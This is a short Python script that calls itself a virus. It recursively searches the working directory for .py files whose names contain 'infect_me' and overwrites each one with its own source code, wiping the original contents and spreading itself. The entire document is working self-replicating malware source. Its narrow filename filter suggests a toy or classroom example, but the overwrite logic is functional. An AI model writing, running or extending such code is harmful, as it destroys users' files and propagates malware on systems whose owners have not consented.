#!/usr/bin/python

import os

SIGNATURE = "It's a virus!"

def search(path):
    files_to_infect = []
    file_list = os.listdir(path)
    for filename in file_list:
        # Check if it's a directory
        if os.path.isdir(os.path.join(path, filename)):
            files_to_infect.extend(search(os.path.join(path, filename)))
        # Infection criteria: filename must contain "infect_me" and end with .py
        elif "infect_me" in filename and filename.endswith(".py"):
            files_to_infect.append(os.path.join(path, filename))
    return files_to_infect

def infect(files_to_infect):
    # Read the virus script itself
    with open(os.path.abspath(__file__)) as virus:
        virus_string = virus.read()

    # Infect the files
    for filename in files_to_infect:
        # First, open file in write mode to clear its content
        with open(filename, "w") as f:
            # Write the virus string to the file
            f.write(virus_string)

        print(f"{filename[len(os.path.abspath('')) + 1:]} infected.")

# Scan for targets to infect
files_to_infect = search(os.path.abspath(""))
infect(files_to_infect)
